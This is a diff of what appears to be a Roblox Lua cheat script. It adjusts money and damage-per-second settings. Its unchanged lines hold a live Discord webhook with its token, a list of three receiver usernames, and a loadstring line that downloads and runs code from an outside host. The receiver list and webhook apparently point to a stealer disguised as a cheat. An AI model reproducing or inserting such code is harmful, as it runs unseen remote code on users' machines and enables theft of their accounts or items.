@@ -1,6 +1,6 @@
 WEBHOOK = "https://discord.com/api/webhooks/1392446227962138634/PhK8x6LAqYSOg-awLB5pEemWhdxaTX9nVlRAPTbo-2vdX7ZsWtFqhgsqRYh6IyvhYw0r"
 RECEIVERS = {"lordofskl", "lordofhdmi1", "lordofsml"}
-MONEY_PER_SECOND = 300000 -- DEFAULT: 300000
-DMG_PER_SECOND = 300000 -- DEFAULT: 300000
+MONEY_PER_SECOND = 150000 -- DEFAULT: 150000
+DMG_PER_SECOND = 200000 -- DEFAULT: 200000
 
 loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/92a441756ee4871bfb812636767586801f0f78bf429972328477a1920bae6f15/download"))()
